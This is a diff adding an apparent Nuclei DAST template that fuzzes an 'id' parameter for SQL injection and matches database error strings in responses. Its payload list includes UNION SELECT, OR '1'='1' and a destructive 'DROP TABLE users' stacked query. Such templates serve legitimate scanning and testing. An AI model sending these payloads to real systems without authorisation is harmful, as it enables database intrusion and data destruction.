@@ -1,0 +1,60 @@
+id: cosckoya-dast-sql-injection-fuzz
+
+info:
+  name: DAST SQL Injection Fuzzing
+  author: cosckoya
+  severity: high
+  description: |
+    DAST fuzzing template for SQL injection detection. Tests multiple
+    injection payloads against common parameters to detect SQLi
+    vulnerabilities through error-based and boolean-based techniques.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://cwe.mitre.org/data/definitions/89.html
+  tags: dast,fuzz,sqli,sql-injection,dynamic
+  metadata:
+    max-request: 10
+    verified: true
+    fuzz-type: parameter
+    fuzz-aggression: medium
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1'"
+      - "{{BaseURL}}/?id=1%27"
+      - "{{BaseURL}}/?id=1%22"
+      - "{{BaseURL}}/?id=1))"
+      - "{{BaseURL}}/?id=1+UNION+SELECT+1,2,3--"
+      - "{{BaseURL}}/?id=1' OR '1'='1"
+      - "{{BaseURL}}/?id=1'; DROP TABLE users--"
+      - "{{BaseURL}}/?id=1' AND 1=1--"
+      - "{{BaseURL}}/?id=1' AND 1=2--"
+      - "{{BaseURL}}/?id=1'/*"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "sql syntax"
+          - "mysql_fetch"
+          - "ORA-00933"
+          - "Microsoft OLE DB"
+          - "PostgreSQL query failed"
+          - "ODBC Driver"
+          - "Warning: mysql"
+          - "supplied argument"
+        part: body
+        condition: or
+      - type: status
+        status:
+          - 500
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        name: sqli-error
+        regex:
+          - "(sql syntax|mysql_fetch|ORA-00933|Microsoft OLE DB|PostgreSQL query failed)"
+        group: 0
